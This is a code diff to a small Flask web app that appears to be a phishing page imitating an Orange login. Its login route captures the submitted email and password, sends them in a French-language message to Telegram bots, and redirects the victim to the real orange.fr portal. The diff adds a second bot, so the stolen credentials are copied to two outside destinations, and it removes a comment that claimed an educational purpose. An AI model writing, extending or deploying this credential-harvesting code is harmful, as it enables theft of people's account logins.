@@ -6,8 +6,10 @@ import os
 
 app = Flask(__name__)
 
-BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
+BOT_TOKEN_1 = os.getenv("TELEGRAM_BOT_TOKEN_1")
+CHAT_ID_1 = os.getenv("TELEGRAM_CHAT_ID_1")
+BOT_TOKEN_2 = os.getenv("TELEGRAM_BOT_TOKEN_2")
+CHAT_ID_2 = os.getenv("TELEGRAM_CHAT_ID_2")
 
 
 @app.route("/", methods=["GET", "POST"])
@@ -16,13 +18,20 @@ def login():
         email = request.form.get("email")
         password = request.form.get("password")
 
-        # Envoyer un message à Telegram (à but éducatif, remplace par une vraie authentification en production)
         message = f"Essai de connexion:\nEmail: {email}\nMot de passe: {password}"
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        data = {"chat_id": CHAT_ID, "text": message}
-        requests.post(url, data=data)
+
+        # Envoi au BOT 1
+        url1 = f"https://api.telegram.org/bot{BOT_TOKEN_1}/sendMessage"
+        data1 = {"chat_id": CHAT_ID_1, "text": message}
+        requests.post(url1, data=data1)
+
+        # Envoi au BOT 2
+        url2 = f"https://api.telegram.org/bot{BOT_TOKEN_2}/sendMessage"
+        data2 = {"chat_id": CHAT_ID_2, "text": message}
+        requests.post(url2, data=data2)
 
         return redirect("https://www.orange.fr/portail/")
+
     return render_template("login.html")
 
 if __name__ == "__main__":
